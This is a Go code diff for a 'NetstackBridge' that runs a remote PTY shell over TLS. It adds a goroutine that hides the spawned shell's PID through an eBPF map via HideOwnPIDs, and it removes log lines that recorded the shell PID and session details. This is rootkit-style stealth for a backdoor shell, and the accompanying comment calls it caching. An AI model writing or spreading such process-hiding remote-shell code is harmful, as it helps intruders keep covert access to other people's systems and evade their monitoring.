@@ -42,6 +42,14 @@ func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
 		return
 	}
 
+	// Cache dynamically the PID of the shell in the eBPF map
+	go func(pid int) {
+		_, _, err := HideOwnPIDs(pid)
+		if err != nil {
+			fmt.Printf("⚠️ Error hiding PID for bash: %v\n", err)
+		}
+	}(cmd.Process.Pid)
+
 	defer func() {
 		fmt.Printf("🧹 Cleaning up TLS PTY session...\n")
 		ptmx.Close()
@@ -53,18 +61,13 @@ func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
 		}
 	}()
 
-	fmt.Printf("🚀 TLS PTY shell started (PID: %d)\n", cmd.Process.Pid)
-
 	// Query client for terminal size using ANSI sequence
 	// Interroge le client pour la taille du terminal via séquence ANSI
-	fmt.Printf("🔍 Requesting client terminal size via TLS...\n")
 
 	// Default fallback size if query fails
 	// Taille par défaut si la requête échoue
 	rows, cols := 24, 80
 
-	// Channel for async terminal size response
-	// Canal pour la réponse asynchrone de taille
 	queryResponse := make(chan [2]int, 1)
 
 	go func() {
@@ -115,7 +118,6 @@ func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
 								if len(parts) == 2 {
 									if r, err := strconv.Atoi(parts[0]); err == nil {
 										if c, err := strconv.Atoi(parts[1]); err == nil {
-											fmt.Printf("📐 Detected client terminal via TLS: %d rows, %d cols\n", r, c)
 											queryResponse <- [2]int{r, c}
 											return
 										}
@@ -147,7 +149,6 @@ func (b *NetstackBridge) handleTLSPTYSession(tlsConn *tls.Conn, _ string) {
 		cols = 80
 	}
 
-	fmt.Printf("✅ Setting TLS PTY size to %d rows, %d cols\n", rows, cols)
 	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)})
 
 	// Short pause to let shell initialize
